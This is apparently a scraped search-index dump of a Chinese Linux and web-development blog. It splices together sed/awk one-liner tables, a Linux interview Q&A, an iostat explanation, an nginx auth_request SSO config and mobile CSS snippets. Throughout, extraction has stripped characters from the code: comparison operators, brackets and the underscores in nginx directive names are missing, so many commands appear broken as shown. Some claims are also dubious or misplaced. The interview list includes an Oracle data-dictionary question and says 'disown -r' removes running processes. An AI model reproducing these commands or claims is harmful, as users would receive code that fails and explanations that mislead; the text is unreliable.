方法1\nsed  -e :a -e 's/^.\\{1,77\\}$/ \u0026/;ta' -e 's/\\( \\)\\1/\\1/'  # 方法2\nawk '{for(i=0;i\u003c39-length($0)/2;i++)printf(\" \");printf(\"%s\\n\",$0)}'  #相当于上面的方法二\n\n在每一行中查找字串“foo”，并将找到的“foo”替换为“bar”\n\nsed 's/foo/bar/'                  只替换每一行中的第一个“foo”字串\nsed 's/foo/bar/4'                # 只替换每一行中的第四个“foo”字串\nsed 's/foo/bar/g'                # 将每一行中的所有“foo”都换成“bar”\nsed 's/\\(.\\)foo\\(.foo\\)/\\1bar\\2/' # 替换倒数第二个“foo”\nsed 's/\\(.\\)foo/\\1bar/'            # 替换最后一个“foo”\nawk '{gsub(/foo/,\"bar\");print $0}'   # 将每一行中的所有“foo”都换成“bar”\n\n只在行中出现字串“baz”的情况下将“foo”替换成“bar”\n\nsed '/baz/s/foo/bar/g'\nawk '{if(/baz/)gsub(/foo/,\"bar\");print $0}'\n\n 将“foo”替换成“bar”，并且只在行中未出现字串“baz”的情况下替换\n\nsed '/baz/!s/foo/bar/g'\nawk '{if(/baz$/)gsub(/foo/,\"bar\");print $0}'\n\n不管是“scarlet”“ruby”还是“puce”，一律换成“red”\n\nsed 's/scarlet/red/g;s/ruby/red/g;s/puce/red/g'  对多数的sed都有效\ngsed 's/scarlet\\|ruby\\|puce/red/g'               # 只对GNU sed有效\nawk '{gsub(/scarlet|ruby|puce/,\"red\");print $0}'\n\n倒置所有行，第一行成为最后一行，依次类推（模拟“tac”）。\n 由于某些原因，使用下面命令时HHsed v1.5会将文件中的空行删除\n\nsed '1!G;h;$!d'               # 方法1\nsed -n '1!G;h;$p'             # 方法2\nawk '{A[i++]=$0}END{for(j=i-1;j  =0;j--)print A[j]}'\n\n将行中的字符逆序排列，第一个字成为最后一字，……（模拟“rev”）\n\nsed '/\\n/!G;s/\\(.\\)\\(.\\n\\)/\u0026\\2\\1/;//D;s/.//'\nawk '{for(i=length($0);i  0;i--)printf(\"%s\",substr($0,i,1));printf(\"\\n\")}'\n\n 将每两行连接成一行（类似“paste”）\n\nsed '$!N;s/\\n/ /'\nawk '{f=!f;if(f)printf(\"%s\",$0);else printf(\" %s\\n\",$0)}'\n\n如果当前行以反斜杠“\\”结束，则将下一行并到当前行末尾\n 并去掉原来行尾的反斜杠\n\nsed -e :a -e '/\\\\$/N; s/\\\\\\n//; ta'\nawk '{if(/\\\\$/)printf(\"%s\",substr($0,0,length($0)-1));else printf(\"%s\\n\",$0)}'\n\n如果当前行以等号开头，将当前行并到上一行末尾\n 并以单个空格代替原来行头的“=”\n\nsed -e :a -e '$!N;s/\\n=/ /;ta' -e 'P;D'\nawk '{if(/^=/)printf(\" %s\",substr($0,2));else printf(\"%s%s\",a,$0);a=\"\\n\"}END{printf(\"\\n\")}'\n\n为数字字串增加逗号分隔符号，将“1234567”改为“1,234,567”\n\ngsed ':a;s/\\B[0-9]\\{3\\}\\  /,\u0026/;ta'                      GNU sed\nsed -e :a -e 's/\\(.[0-9]\\)\\([0-9]\\{3\\}\\)/\\1,\\2/;ta'  # 其他sed\n\nawk的正则没有后向匹配和引用，搞的比较狼狈，呵呵。\n\nawk '{while(match($0,/0-90-9+/)){$0=sprintf(\"%s,%s\",substr($0,0,RSTART+RLENGTH-4),substr($0,RSTART+RLENGTH-3))}print $0}'\n\n 为带有小数点和负号的数值增加逗号分隔符（GNU sed）\n\ngsed -r ':a;s/(^|)([0-9]+)([0-9]{3})/\\1\\2,\\3/g;ta'\n\n和上例差不多\n\nawk '{while(match($0,/0-90-9+/)){$0=sprintf(\"%s,%s\",substr($0,0,RSTART+RLENGTH-4),substr($0,RSTART+RLENGTH-3))}print $0}'\n\n 在每5行后增加一空白行 （在第5，10，15，20，等行后增加一空白行）\n\ngsed '0~5G'                      # 只对GNU sed有效\nsed 'n;n;n;n;G;'                 # 其他sed\nawk '{print $0;i++;if(i==5){printf(\"\\n\");i=0}}'\n\n选择性地显示特定行：\n\n显示文件中的前10行 （模拟“head”的行为）\n\nsed 10q\nawk '{print;if(NR==10)exit}'\n\n 显示文件中的第一行 （模拟“head -1”命令）\n\nsed q\nawk '{print;exit}'\n\n显示文件中的最后10行 （模拟“tail”）\n\nsed -e :a -e '$q;N;11,$D;ba'\n\n用awk干这个有点亏，得全文缓存，对于大文件肯定很慢\n\nawk '{A[NR]=$0}END{for(i=NR-9;i\u003c=NR;i++)print A[i]}'\n\n显示文件中的最后2行（模拟“tail -2”命令）\n\nsed '$!N;$!D'\nawk '{A[NR]=$0}END{for(i=NR-1;i\u003c=NR;i++)print A[i]}'\n\n 显示文件中的最后一行（模拟“tail -1”）\n\nsed '$!d'                        # 方法1\nsed -n '$p'                      # 方法2\n\n这个比较好办，只存最后一行了。\n\nawk '{A=$0}END{print A}'\n\n 显示文件中的倒数第二行\n\nsed -e '$!{h;d;}' -e x              # 当文件中只有一行时，输出空行\nsed -e '1{$q;}' -e '$!{h;d;}' -e x  # 当文件中只有一行时，显示该行\nsed -e '1{$d;}' -e '$!{h;d;}' -e x  # 当文件中只有一行时，不输出\n\n存两行呗（当文件中只有一行时，输出空行）\n\nawk '{B=A;A=$0}END{print B}'\n\n 只显示匹配正则表达式的行（模拟“grep”）\n\nsed -n '/regexp/p'               # 方法1\nsed '/regexp/!d'                 # 方法2\nawk '/regexp/{print}'\n\n只显示“不”匹配正则表达式的行（模拟“grep -v”）\n\nsed -n '/regexp/!p'               方法1，与前面的命令相对应\nsed '/regexp/d'                  # 方法2，类似的语法\nawk '!/regexp/{print}'\n\n查找“regexp”并将匹配行的上一行显示出来，但并不显示匹配行\n\nsed -n '/regexp/{g;1!p;};h'\nawk '/regexp/{print A}{A=$0}'\n\n 查找“regexp”并将匹配行的下一行显示出来，但并不显示匹配行\n\nsed -n '/regexp/{n;p;}'\nawk '{if(A)print;A=0}/regexp/{A=1}'\n\n显示包含“regexp”的行及其前后行，并在第一行之前加上“regexp”所在行的行号 （类似“grep -A1 -B1”）\n\nsed -n -e '/regexp/{=;x;1!p;g;$!N;p;D;}' -e h\nawk '{if(F)print;F=0}/regexp/{print NR;print b;print;F=1}{b=$0}'\n\n 显示包含“AAA”、“BBB”和“CCC”的行（任意次序）\n\nsed '/AAA/!d; /BBB/!d; /CCC/!d'   # 字串的次序不影响结果\nawk '{if(match($0,/AAA/) \u0026\u0026 match($0,/BBB/) \u0026\u0026 match($0,/CCC/))print}'\n\n显示包含“AAA”、“BBB”和“CCC”的行（固定次序）\n\nsed '/AAA.BBB.CCC/!d'\nawk '{if(match($0,/AAA.BBB.CCC/))print}'\n\n 显示包含“AAA”“BBB”或“CCC”的行 （模拟“egrep”）\n\nsed -e '/AAA/b' -e '/BBB/b' -e '/CCC/b' -e d    # 多数sed\ngsed '/AAA\\|BBB\\|CCC/!d'                        # 对GNU sed有效\nawk '/AAA/{print;next}/BBB/{print;next}/CCC/{print}'\nawk '/AAA|BBB|CCC/{print}'\n\n显示包含“AAA”的段落 （段落间以空行分隔）\n HHsed v1.5 必须在“x;”后加入“G;”，接下来的3个脚本都是这样\n\nsed -e '/./{H;$!d;}' -e 'x;/AAA/!d;'\nawk 'BEGIN{RS=\"\"}/AAA/{print}'\nawk -vRS= '/AAA/{print}'\n\n显示包含“AAA”“BBB”和“CCC”三个字串的段落 （任意次序）\n\nsed -e '/./{H;$!d;}' -e 'x;/AAA/!d;/BBB/!d;/CCC/!d'\nawk -vRS= '{if(match($0,/AAA/) \u0026\u0026 match($0,/BBB/) \u0026\u0026 match($0,/CCC/))print}'\n\n 显示包含“AAA”、“BBB”、“CCC”三者中任一字串的段落 （任意次序）\n\nsed -e '/./{H;$!d;}' -e 'x;/AAA/b' -e '/BBB/b' -e '/CCC/b' -e d\ngsed '/./{H;$!d;};x;/AAA\\|BBB\\|CCC/b;d'         # 只对GNU sed有效\nawk -vRS= '/AAA|BBB|CCC/{print \"\";print}'\n\n显示包含65个或以上字符的行\n\nsed -n '/^.\\{65\\}/p'\n\ncat ll.txt | awk '{if(length($0)  =65)print}'\n\n 显示包含65个以下字符的行\n\nsed -n '/^.\\{65\\}/!p'            # 方法1，与上面的脚本相对应\nsed '/^.\\{65\\}/d'                # 方法2，更简便一点的方法\nawk '{if(length($0)\u003c=65)print}'\n\n显示部分文本——从包含正则表达式的行开始到最后一行结束\n\nsed -n '/regexp/,$p'\nawk '/regexp/{F=1}{if(F)print}'\n\n 显示部分文本——指定行号范围（从第8至第12行，含8和12行）\n\nsed -n '8,12p'                   # 方法1\nsed '8,12!d'                     # 方法2\nawk '{if(NR  =8 \u0026\u0026 NR\u003c12)print}'\n\n显示第52行\n\nsed -n '52p'                      方法1\nsed '52!d'                       # 方法2\nsed '52q;d'                      # 方法3, 处理大文件时更有效率\nawk '{if(NR==52){print;exit}}'\n\n从第3行开始，每7行显示一次\n\ngsed -n '3~7p'                    只对GNU sed有效\nsed -n '3,${p;n;n;n;n;n;n;}'     # 其他sed\nawk '{if(NR==3)F=1}{if(F){i++;if(i%7==1)print}}'\n\n显示两个正则表达式之间的文本（包含）\n\nsed -n '/Iowa/,/Montana/p'        区分大小写方式\nawk '/Iowa/{F=1}{if(F)print}/Montana/{F=0}'\n\n选择性地删除特定行：\n\n显示通篇文档，除了两个正则表达式之间的内容\n\nsed '/Iowa/,/Montana/d'\nawk '/Iowa/{F=1}{if(!F)print}/Montana/{F=0}'\n\n 删除文件中相邻的重复行（模拟“uniq”）\n只保留重复行中的第一行，其他行删除\n\nsed '$!N; /^\\(.\\)\\n\\1$/!P; D'\nawk '{if($0!=B)print;B=$0}'\n\n 删除文件中的重复行，不管有无相邻。注意hold space所能支持的缓存大小，或者使用GNU sed。\n\nsed -n 'G; s/\\n/\u0026\u0026/; /^\\([ -~]\\n\\).\\n\\1/d; s/\\n//; h; P'  #bones7456注：我这里此命令并不能正常工作\nawk '{if(!($0 in B))print;B[$0]=1}'\n\n删除除重复行外的所有行（模拟“uniq -d”）\n\nsed '$!N; s/^\\(.\\)\\n\\1$/\\1/; t; D'\nawk '{if($0==B \u0026\u0026 $0!=l){print;l=$0}B=$0}'\n\n 删除文件中开头的10行\n\nsed '1,10d'\nawk '{if(NR  10)print}'\n\n删除文件中的最后一行\n\nsed '$d'\n\nawk在过程中并不知道文件一共有几行，所以只能通篇缓存，大文件可能不适合，下面两个也一样\n\nawk '{B[NR]=$0}END{for(i=0;i\u003c=NR-1;i++)print B[i]}'\n\n删除文件中的最后两行\n\nsed 'N;$!P;$!D;$d'\nawk '{B[NR]=$0}END{for(i=0;i\u003c=NR-2;i++)print B[i]}'\n\n 删除文件中的最后10行\n\nsed -e :a -e '$d;N;2,10ba' -e 'P;D'   # 方法1\nsed -n -e :a -e '1,10!{P;N;D;};N;ba'  # 方法2\nawk '{B[NR]=$0}END{for(i=0;i\u003c=NR-10;i++)print B[i]}'\n\n删除8的倍数行\n\ngsed '0~8d'                            只对GNU sed有效\nsed 'n;n;n;n;n;n;n;d;'                # 其他sed\nawk '{if(NR%8!=0)print}' |head\n\n删除匹配式样的行\n\nsed '/pattern/d'                       删除含pattern的行。当然pattern可以换成任何有效的正则表达式\nawk '{if(!match($0,/pattern/))print}'\n\n删除文件中的所有空行（与“grep ‘.’ ”效果相同）\n\nsed '/^$/d'                            方法1\nsed '/./!d'                           # 方法2\nawk '{if(!match($0,/^$/))print}'\n\n只保留多个相邻空行的第一行。并且删除文件顶部和尾部的空行。\n （模拟“cat -s”）\n\nsed '/./,/^$/!d'        #方法1，删除文件顶部的空行，允许尾部保留一空行\nsed '/^$/N;/\\n$/D'      #方法2，允许顶部保留一空行，尾部不留空行\nawk '{if(!match($0,/^$/)){print;F=1}else{if(F)print;F=0}}'  #同上面的方法2\n\n只保留多个相邻空行的前两行。\n\nsed '/^$/N;/\\n$/N;//D'\nawk '{if(!match($0,/^$/)){print;F=0}else{if(F\u003c2)print;F++}}'\n\n 删除文件顶部的所有空行\n\nsed '/./,$!d'\nawk '{if(F || !match($0,/^$/)){print;F=1}}'\n\n删除文件尾部的所有空行\n\nsed -e :a -e '/^\\n$/{$d;N;ba' -e '}'   对所有sed有效\nsed -e :a -e '/^\\n$/N;/\\n$/ba'        # 同上，但只对 gsed 3.02.有效\nawk '/^.+$/{for(i=l;i","tags":null},{"location":"//blog.pytool.com/basic/10个核心的Linux面试问题与答案","title":"10个核心的Linux面试问题与答案","text":"10个核心的Linux面试问题与答案\n\n 1. 问： 当你需要给命令绑定一个宏或者按键的时候，应该怎么做呢？\n\n答：可以使用bind命令，bind可以很方便地在shell中实现宏或按键的绑定。\n\n在进行按键绑定的时候，我们需要先获取到绑定按键对应的字符序列。\n\n比如获取F12的字符序列获取方法如下：先按下Ctrl+V,然后按下F12 .我们就可以得到F12的字符序列 ^\\[\\[24~。\n\n接着使用bind进行绑定。\n\nspan class=\"crayon-title\"/span\n\n\\[root@localhost ~\\]\\# bind ‘”\\\\e\\[24~\":\"date\"'\n\n注意：相同的按键在不同的终端或终端模拟器下可能会产生不同的字符序列。\n\n【附】也可以使用showkey -a命令查看按键对应的字符序列。\n\n \n\n2. 问： 如果一个linux新手想要知道当前系统支持的所有命令的列表，他需要怎么做？\n\n答： 使用命令compgen ­-c，可以打印出所有支持的命令列表。\n\n 3. 问：如果你的助手想要打印出当前的目录栈，你会建议他怎么做？\n\n答：使用Linux 命令dirs可以将当前的目录栈打印出来。\n\nspan class=\"crayon-title\"/span\n\n\\[root@localhost ~\\]\\# dirs /usr/share/X11\n\n【附】：目录栈通过pushd popd 来操作。\n\n \n\n4. 问： 你的系统目前有许多正在运行的任务，在不重启机器的条件下，有什么方法可以把所有正在运行的进程移除呢？\n\n答： 使用linux命令 ’disown -r ’可以将所有正在运行的进程移除。\n\n \n\n 5. 问： bash shell 中的hash 命令有什么作用？\n\n答：linux命令’hash’管理着一个内置的哈希表，记录了已执行过的命令的完整路径, 用该命令可以打印出你所使用过的命令以及执行的次数。\n\nspan class=\"crayon-title\"/span\n\n\\[root@localhost ~\\]\\# hash hits command 2 /bin/ls 2 /bin/su\n\n6. 问：哪一个bash内置命令能够进行数学运算。\n\n答： bash shell 的内置命令let 可以进行整型数的数学运算。\n\nspan class=\"crayon-title\"/span\n\n\\! /bin/bash … … let c=a+b … …\n\n8. 问：数据字典属于哪一个用户的？\n\n答：数据字典是属于’SYS’用户的，用户‘SYS’ 和 ’SYSEM’是由系统默认自动创建的。\n\n \n\n 9 .  问： 怎样查看一个linux命令的概要与用法？\n\n假设你在/bin目录中偶然看到一个你从没见过的的命令，怎样才能知道它的作用和用法呢？\n\n答 ： 使用命令whatis 可以先出显示出这个命令的用法简要，比如，你可以使用whatis zcat 去查看‘zcat’的介绍以及使用简要。\n\n\\[root@localhost ~\\]\\# whatis zcat zcat \\[gzip\\] (1) – compress or expand files\nwhatis git-submodule\ngit-submodule (1)    - Initialize, update or inspect submodules\n\n10.  span style=\"font-family: 宋体;\"问：使用哪一个命令可以查看自己文件系统的磁盘空间配额呢？/span\n\n答： 使用命令span style=\"font-family: 'Times New Roman';\"repquota /spanspan style=\"font-family: 宋体;\"能够显示出一个文件系统的配额信息/span\n\n【附】只有span style=\"font-family: 'Times New Roman';\"root/spanspan style=\"font-family: 宋体;\"用户才能够查看其它用户的配额。/span\n\n \n\n到这里，整个面试就结束啦，请将您的宝贵意见在评论中反馈给我们，敬请期待更多的Linux以及开源软件文章。","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 iostat","title":"Linux命令 iostat","text":"以前一直不太会用这个参数.现在认真研究了一下iostat,因为刚好有台重要的服务器压力高,所以放上来分析一下.下面这台就是IO有压力过大的服务器\n$iostat -x 1\nLinux 2.6.33-fukai (fukai-laptop)          i686    (2 CPU)\navg-cpu:  %user   %nice %system %iowait  %steal   %idle\n           5.47    0.50    8.96   48.26    0.00   36.82\n\nDevice:         rrqm/s   wrqm/s     r/s     w/s   rsec/s   wsec/s avgrq-sz avgqu-sz   await  svctm  %util\nsda               6.00   273.00   99.00    7.00  2240.00  2240.00    42.26     1.12   10.57   7.96  84.40\nsdb               0.00     4.00    0.00  350.00     0.00  2068.00     5.91     0.55    1.58   0.54  18.80\n\nrrqm/s:   每秒进行 merge 的读操作数目.即 delta(rmerge)/s\nwrqm/s:  每秒进行 merge 的写操作数目.即 delta(wmerge)/s\nr/s:           每秒完成的读 I/O 设备次数.即 delta(rio)/s\nw/s:         每秒完成的写 I/O 设备次数.即 delta(wio)/s\nrsec/s:    每秒读扇区数.即 delta(rsect)/s\nwsec/s:  每秒写扇区数.即 delta(wsect)/s\nrkB/s:      每秒读K字节数.是 rsect/s 的一半,因为每扇区大小为512字节.(需要计算)\nwkB/s:    每秒写K字节数.是 wsect/s 的一半.(需要计算)\navgrq-sz: 平均每次设备I/O操作的数据大小 (扇区).delta(rsect+wsect)/delta(rio+wio)\navgqu-sz: 平均I/O队列长度.即 delta(aveq)/s/1000 (因为aveq的单位为毫秒).\nawait:    平均每次设备I/O操作的等待时间 (毫秒).即 delta(ruse+wuse)/delta(rio+wio)\nsvctm:   平均每次设备I/O操作的服务时间 (毫秒).即 delta(use)/delta(rio+wio)\n%util:      一秒中有百分之多少的时间用于 I/O 操作,或者说一秒中有多少时间 I/O 队列是非空的.即 delta(use)/s/1000 (因为use的单位为毫秒)\n\n如果 %util 接近 100%,说明产生的I/O请求太多,I/O系统已经满负荷,该磁盘\n可能存在瓶颈.\nidle小于70% IO压力就较大了,一般读取速度有较多的wait.\n同时可以结合vmstat 查看查看b参数(等待资源的进程数)和wa参数(IO等待所占用的CPU时间的百分比,高过30%时IO压力高)\n另外 await 的参数也要多和 svctm 来参考.差的过高就一定有 IO 的问题.\navgqu-sz 也是个做 IO 调优时需要注意的地方,这个就是直接每次操作的数据的大小,如果次数多,但数据拿的小的话,其实 IO 也会很小.如果数据拿的大,才IO 的数据会高.也可以通过 avgqu-sz × ( r/s or w/s ) = rsec/s or wsec/s.也就是讲,读定速度是这个来决定的.\n\n另外还可以参考\nsvctm 一般要小于 await (因为同时等待的请求的等待时间被重复计算了),svctm 的大小一般和磁盘性能有关,CPU/内存的负荷也会对其有影响,请求过多也会间接导致 svctm 的增加.await 的大小一般取决于服务时间(svctm) 以及 I/O 队列的长度和 I/O 请求的发出模式.如果 svctm 比较接近 await,说明 I/O 几乎没有等待时间；如果 await 远大于 svctm,说明 I/O 队列太长,应用得到的响应时间变慢,如果响应时间超过了用户可以容许的范围,这时可以考虑更换更快的磁盘,调整内核 elevator 算法,优化应用,或者升级 CPU.\n队列长度(avgqu-sz)也可作为衡量系统 I/O 负荷的指标,但由于 avgqu-sz 是按照单位时间的平均值,所以不能反映瞬间的 I/O 洪水.\n\n  别人一个不错的例子.(I/O 系统 vs. 超市排队)\n\n举一个例子,我们在超市排队 checkout 时,怎么决定该去哪个交款台呢? 首当是看排的队人数,5个人总比20人要快吧? 除了数人头,我们也常常看看前面人购买的东西多少,如果前面有个采购了一星期食品的大妈,那么可以考虑换个队排了.还有就是收银员的速度了,如果碰上了连 钱都点不清楚的新手,那就有的等了.另外,时机也很重要,可能 5 分钟前还人满为患的收款台,现在已是人去楼空,这时候交款可是很爽啊,当然,前提是那过去的 5 分钟里所做的事情比排队要有意义 (不过我还没发现什么事情比排队还无聊的).\n\nI/O 系统也和超市排队有很多类似之处:\n\nr/s+w/s 类似于交款人的总数\n平均队列长度(avgqu-sz)类似于单位时间里平均排队人的个数\n平均服务时间(svctm)类似于收银员的收款速度\n平均等待时间(await)类似于平均每人的等待时间\n平均I/O数据(avgrq-sz)类似于平均每人所买的东西多少\nI/O 操作率 (%util)类似于收款台前有人排队的时间比例.\n\n我们可以根据这些数据分析出 I/O 请求的模式,以及 I/O 的速度和响应时间.\n\n下面是别人写的这个参数输出的分析\n\niostat -x 1\navg-cpu: %user %nice %sys %idle\n16.24 0.00 4.31 79.44\nDevice: rrqm/s wrqm/s r/s w/s rsec/s wsec/s rkB/s wkB/s avgrq-sz avgqu-sz await svctm %util\n/dev/cciss/c0d0\n0.00 44.90 1.02 27.55 8.16 579.59 4.08 289.80 20.57 22.35 78.21 5.00 14.29\n\n上面的 iostat 输出表明秒有 28.57 次设备 I/O 操作: 总IO(io)/s = r/s(读) +w/s(写) = 1.02+27.55 = 28.57 (次/秒) 其中写操作占了主体 (w:r = 27:1).\n\n平均每次设备 I/O 操作只需要 5ms 就可以完成,但每个 I/O 请求却需要等上 78ms,为什么? 因为发出的 I/O 请求太多 (每秒钟约 29 个),假设这些请求是同时发出的,那么平均等待时间可以这样计算:\n\n平均等待时间 = 单个 I/O 服务时间  ( 1 + 2 + … + 请求总数-1) / 请求总数\n\n应用到上面的例子: 平均等待时间 = 5ms  (1+2+…+28)/29 = 70ms,和 iostat 给出的78ms 的平均等待时间很接近.这反过来表明 I/O 是同时发起的.\n\n每秒发出的 I/O 请求很多 (约 29 个),平均队列却不长 (只有 2 个 左右),这表明这 29 个请求的到来并不均匀,大部分时间 I/O 是空闲的.\n\n一秒中有 14.29% 的时间 I/O 队列中是有请求的,也就是说,85.71% 的时间里 I/O 系统无事可做,所有 29 个 I/O 请求都在142毫秒之内处理掉了.\n\ndelta(ruse+wuse)/delta(io) = await = 78.21 =  delta(ruse+wuse)/s =78.21  delta(io)/s = 78.2128.57 = 2232.8,表明每秒内的I/O请求总共需要等待2232.8ms.所以平均队列长度应为 2232.8ms/1000ms = 2.23,而 iostat 给出的平均队列长度 (avgqu-sz) 却为 22.35,为什么?! 因为 iostat 中有 bug,avgqu-sz 值应为 2.23,而不是 22.35.","tags":null},{"location":"//blog.pytool.com/Post/nginx/2016-01-01 Linux命令 nginx auth_request sso","title":"Linux命令 Nginx sso","text":"https://github.com/bnfinet/lasso  go\nhttps://github.com/clems4ever/authelia  nodejs\n\nhttps://heipei.github.io/2015/09/23/nginx-sso-Simple-offline-SSO-for-nginx/\nThis is the vserver for the service that you want to protect.\n\tserver {\n\t\tservername secret.domain.dev;\n\t\tlisten 8080;\n\n\t\t It has one /auth URI which is the endpoint that protected\n\t\t# resources have to query. The /auth endpoint does not need the\n\t\t# requestbody, but it obviously needs the IP, Host and\n\t\t# original URI for the request.\n\t\tlocation = /auth {\n\t\t\tinternal;\n\n\t\t\tproxypass http://127.0.0.1:8082;\n\n\t\t\tproxypassrequestbody     off;\n\n\t\t\tproxysetheader Content-Length \"\";\n\t\t\tproxysetheader X-Original-URI $requesturi;\n\t\t\tproxysetheader Host $httphost;\n\t\t\tproxysetheader X-Real-IP $remoteaddr;\n\n\t\t}\n\n\t\t# This is an example of a protected resource. The first line\n\t\t# should be authrequest. If you want to pass the headers from\n\t\t# the authentication backend to your application (Remote-User\n\t\t# etc), you'll have to include the lines with authrequestset\n\t\t# and proxyset header.\n\t\tlocation /secret {\n\t\t\tauthrequest /auth;\n\n\t\t\tauthrequestset $user $upstreamhttpremoteuser;\n\t\t\tproxysetheader Remote-User $user;\n\t\t\tauthrequestset $groups $upstreamhttpremotegroups;\n\t\t\tproxysetheader Remote-Groups $groups;\n\t\t\tauthrequestset $expiry $upstreamhttpremoteexpiry;\n\t\t\tproxysetheader Remote-Expiry $expiry;\n\n\t\t\t#return 200 \"Open Sesame!\";\n\t\t\tproxypass http://127.0.0.1:52342;\n\t\t}\n\n\t}\n\n\t# This is the vserver for your login service\n\tserver {\n\t\tservername login.domain.dev;\n\t\tlisten 8080 defaultserver;\n\n\t\t# The login endpoint also needs the Host and real IP of the\n\t\t# client to build the sso cookie.\n\t\tlocation /login {\n\t\t\tproxysetheader X-Original-URI $requesturi;\n\t\t\tproxysetheader Host $httphost;\n\t\t\tproxysetheader X-Real-IP $remoteaddr;\n\t\t\tproxypass http://127.0.0.1:8081;\n\n\t\t}\n}\n`","tags":null},{"location":"//blog.pytool.com/Post/前端技术/2016-11-09 html 移动端适配","title":"html","text":"HTML5 元素\n\n对 HTML 的设置\n    !DOCTYPE html 设置正确的浏览器渲染模式\n    html lang=\"zh-cmn-Hans\" 设置页面内容的语言为简体中文；html lang=\"zh-cmn-Hant\" 为繁体中文；html lang=\"en\" 为英文。这么写的原因\n    meta charset=\"UTF-8\" 设置编码格式为 UTF-8\n    meta name=\"format-detection\" content=\"telephone=no\" / 当该 HTML 页面在手机上浏览时，该标签用于指定是否将网页内容中的手机号码显示为拨号的超链接，iPhone 上默认 telephone 设置为 yes\n    meta name=\"format-detection\" content=\"email=no\" / 忽略 Android 平台中对邮箱地址的识别\n    meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\" 详情使用参考 MDN-在移动浏览器中使用 viewport 元标签控制布局\n    link rel=\"icon\" href=\"*/.*\" / 设置 icon\n浏览器重置样式设置\n\nreset.css\n\n1.可重置点击链接时出现的高亮颜色及 outline\n\n        {\n          outline: 0;\n          -webkit-tap-highlight-color: transparent;\n        }\n\n参考 -webkit-tap-highlight-color\n\n2.text-size-adjust\n\n        html {\n          -webkit-text-size-adjust: 100%;\n          -moz-text-size-adjust: 100%;\n          -ms-text-size-adjust: 100%;\n        }\n\n参考 text-size-adjust\n\n3.大屏幕下 body 水平居中\n\n        body {\n          margin: 0 auto;\n          padding: 0;\n          max-width: 540px;\n        }\n\n4.设置图片无法被选中\n\n        img {\n          -webkit-user-select: none;\n          -moz-user-select: none;\n          -ms-user-select: none;\n        }\n\n参考 user-select\n公有样式设置\n\nstyle.css\n\n1.使用面向属性的 CSS\n\n        .fs12 {\n          font-size: 12px;\n        }\n        .fs14 {\n          font-size: 14px;\n        }\n        .fw200 {\n          font-weight: 200;\n        }\n        .fw600 {\n          font-weight: 600;\n        }\n\n2.clearfix 清除浮动\n\n        .clearfix {\n          zoom: 1;\n        }\n        .clearfix:after {\n          content: \"\";\n          display: block;\n          height: 0;\n          visibility: hidden;\n          clear: both;\n        }\n\n3.0.5px 边框实现\n\n        .bd05 {\n          position: relative;\n        }\n        .bd05:before {\n          content: '';\n          position: absolute;\n          top: 0;\n          left: 0;\n          width: 200%;\n          height: 200%;\n          box-sizing: border-box;\n          border: 1px solid transparent;\n          transform-origin: left top;\n          transform: scale(0.5);\n          z-index: -1;\n        }\n\n4.遮罩层样式\n\n        .shade {\n          display: none;\n          position: absolute;\n          top: 0;\n          left: 0;\n          min-width: 100%;\n          min-height:100%;\n          background: rgba(0, 0, 0, 0.7);\n          z-index: 800;\n        }\n\n5.人民币符号\n\n        .rmb:before {\n          content: '￥';\n          vertical-align: baseline;\n        }\n\n集成手淘 rem 方案\n\n    可伸缩布局方案\n    使用 Flexible 实现手淘 H5 页面的终端适配\n    flexible.js 源码\n\n阅读源码可以知道，如果我们设置了 viewport 元数据，那么 dpr = 1 / scale；如果手动设置 flexible，则 dpr 取决于设置值；如果两者都不设置，那么 flexible.js 会根据 IOS/Android 平台去动态生成 meta 标签并设置 dpr（此时 dpr 值可能为 1~3）及缩放比例。\n\n建议使用修改源码后的 rem.js，设置 viewport 视口，在锁定缩放比例的同时，还可以使用 html data-dpr=\"1~3\" 提供的 class 过滤功能。\n\n一个0.5像素边框的东西：\n\n.bd1pxscale {\n  position: relative;\n}\n.bd1pxscale:before {\n  content: '';\n  position: absolute;\n  top: 0;\n  left: 0;\n  width: 200%;\n  height: 200%;\n  box-sizing: border-box;\n  border: 1px solid transparent;\n  transform-origin: left top;\n  transform: scale(0.5);\n  z-index: -1;\n}\n\n这种比图片的好处就是可以有圆角2333\n不过需要是写成2倍的弧度","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 rename","title":"Linux命令 rename","text":"批量去掉文件名里的空格\nrename      's/[ ]+//g'       \n方括号内的空格可以用[:space:]代替，\n即可以写成's/[[:space:]]+//g'\n\n3.1 将所有.nc文件中Sam3替换成Stm32\nrename -v 's/Sam3/Stm32/' .nc　　/执行修改，并列出已重命名的文件/\n3.2 去掉文件后缀名(比如去掉.bak)\nrename 's/\\.bak$//' .bak\n3.3 将文件名改为小写\nrename 'y/A-Z/a-z/' \n3.4 去掉文件名的空格\nrename 's/[ ]+//g' \n3.5 文件开头加入字符串(比如jelline)\nrename 's/^/jelline/' \n3.6 文件末尾加入字符串(比如jelline)\nrename 's/$/jelline/' \n\n还有几个好玩的例子：\n比如统一在文件头部添加上hello\nrename         's/^/hello/'       \n统一把.html扩展名修改为.htm\nrename          's/.html$/.htm/'      \n统一在尾部追加.zip后缀：\nrename          's/$/.zip/'      \n统一去掉.zip后缀：\n\nrename          's/.zip$//'      \n\n规则化数字编号名，比如1.jpg, 2.jpg ..... 100.jpg , 现在要使文件名全部三位即1.jpg .... 001.jpg\n\n运行两次命令：\n\nrename           's/^/00/'          [0-9].jpg      这一步把1.jpg ..... 9.jpg 变幻为001.jpg .... 009.jpg\n\nrename            's/^/0/'           0-9.jpg   # 这一步把10.jpg ..... 99.jpg 变幻为010.jpg ..... 090.jpg\n\nOk ，rename就研究了这么多，暂时不知道如何在rename中引入动态变量，比如$i++\n\n我测试过i=0;  rename -n \"s/^.$/$((++i))/\"    执行后i被自增了1,并非想我想像中那样，可以在每操作一个文件自增一，猜想可能是因为rename批量实现的，导致++i只计算一次！\n\n-n  用来测试rename过程，并不直接运行，可以查看测试效果后，然后再运行。\n好了，再次说明一下，你在使用的时候一定要确认一下你语言的版本，我的是C语言版本~\n\nRENAME(1)                  Linux Programmer’s Manual                 RENAME(1)\n\n功能：\n\n rename from to file...\n\n用法：\n\nFor example, given the files foo1, ..., foo9, foo10, ..., foo278, the commands\n              rename foo foo0 foo?\n              rename foo foo0 foo??\n       will turn them into foo001, ..., foo009, foo010, ..., foo278.\n\nAnd\n              rename .htm .html .htm\n       will fix the extension of your html 